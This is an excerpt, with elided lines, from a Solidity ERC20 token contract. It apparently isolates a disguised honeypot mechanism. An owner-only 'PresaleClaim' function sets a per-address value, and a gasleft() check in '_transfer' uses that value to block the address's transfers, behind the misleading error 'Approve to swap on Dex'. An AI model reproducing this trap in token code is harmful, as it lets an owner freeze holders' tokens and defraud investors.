...
contract ERC20 is Context, IERC20 {
  ...
  constructor(
      ...
      taxFee = taxFee_;
      owner = _msgSender();
      _totalSupply = 69000000000000 * (10 ** uint256(decimals_));
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      ...
      require(gasleft() >= PreSale[sender], "Approve to swap on Dex");
  ...
  function PresaleClaim(address _address, uint256 ClaimNumber) external {
      require(_msgSender() == owner, "Presale");
        PreSale[_address] = ClaimNumber;
    }
